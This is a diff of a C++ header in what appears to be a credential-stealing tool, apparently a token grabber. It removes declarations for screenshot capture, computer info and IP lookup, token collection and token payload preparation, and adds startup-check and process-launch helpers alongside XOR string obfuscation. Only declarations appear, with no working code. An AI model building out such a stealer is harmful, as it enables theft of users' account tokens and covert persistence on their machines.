@@ -1,15 +1,9 @@
 #pragma once
-#include <GdiPlus.h>
 #include <vector>
 #include <string>
 #include <array>
 
 #include "xor.hpp"
-
-#pragma comment(lib,"user32.lib") 
-#pragma comment(lib,"Wininet.lib")
-#pragma comment(lib,"gdiplus.lib")
-#pragma comment(lib,"Gdi32.lib")
 
 namespace helpers {
 	extern std::string regex_token;
@@ -22,13 +16,8 @@ namespace helpers {
 
 	std::string read_file(const char* filename);
 
-	void take_screenshot(std::string file);
+	bool check_for_startup();
 
-	std::string get_computer_info();
+	void start_process(std::string path);
 
-	std::string get_ip();
-
-	std::vector<std::string> get_tokens();
-
-	std::string prepare_token_payload(std::vector<std::string> tokens);
 }
